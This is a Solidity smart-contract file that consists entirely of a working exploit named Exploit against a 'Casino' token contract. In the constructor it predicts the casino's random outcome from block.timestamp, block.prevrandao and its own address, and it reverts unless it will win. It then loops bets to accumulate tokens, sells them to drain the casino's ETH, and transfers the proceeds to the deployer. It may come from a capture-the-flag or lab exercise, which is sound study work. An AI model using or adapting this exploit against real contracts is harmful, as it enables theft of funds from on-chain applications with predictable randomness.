// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICasino {
    function buyLuck() external payable;
    function sellLuck(uint256 amount) external;
    function play(uint256 betAmount) external;
    function token() external view returns (address);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract Exploit {
    constructor(address payable _casino) payable {
        ICasino casino = ICasino(_casino);
        IERC20 token = IERC20(casino.token());

        // Pre-calculate random to ensure we win
        // The casino uses:
        // uint256 random = uint256(keccak256(abi.encodePacked(
        //    block.timestamp, 
        //    block.prevrandao, 
        //    msg.sender
        // ))) % 100;
        // Here msg.sender is address(this)
        
        uint256 random = uint256(keccak256(abi.encodePacked(
            block.timestamp, 
            block.prevrandao, 
            address(this)
        ))) % 100;

        // If we aren't going to win, revert to save gas/funds and try again with a new nonce/address
        require(random < 25, "Bad luck, try again");

        // 1. Buy LUCK
        uint256 initialEth = address(this).balance;
        require(initialEth > 0, "Need ETH to play");
        
        casino.buyLuck{value: initialEth}();
        
        // 2. Approve
        token.approve(address(casino), type(uint256).max);

        // 3. Play loop
        // We want to drain the casino's ETH.
        // We need enough tokens to sell for the ETH.
        // 1 Token = 100 Wei.
        
        while (address(casino).balance > 0) {
             uint256 myTokens = token.balanceOf(address(this));
             uint256 casinoTokens = token.balanceOf(address(casino));
             
             // If we have enough tokens to drain the ETH, stop playing and sell
             if (myTokens * 100 >= address(casino).balance) {
                 break;
             }

             // Bet amount
             // We can bet up to myTokens
             // But payout is 4x bet. Casino must have 4x bet.
             // So bet <= casinoTokens / 4
             
             uint256 bet = myTokens;
             if (bet > casinoTokens / 4) {
                 bet = casinoTokens / 4;
             }
             
             if (bet == 0) break;

             casino.play(bet);
        }

        // 4. Sell tokens
        uint256 tokensToSell = token.balanceOf(address(this));
        // Cap at casino balance
        uint256 maxEth = address(casino).balance;
        // ethAmount = amount * RATE (100)
        // amount = ethAmount / 100
        uint256 maxTokens = maxEth / 100;
        
        if (tokensToSell > maxTokens) {
            tokensToSell = maxTokens;
        }
        
        if (tokensToSell > 0) {
            casino.sellLuck(tokensToSell);
        }
        
        // 5. Return funds
        payable(msg.sender).transfer(address(this).balance);
    }
    
    receive() external payable {}
}
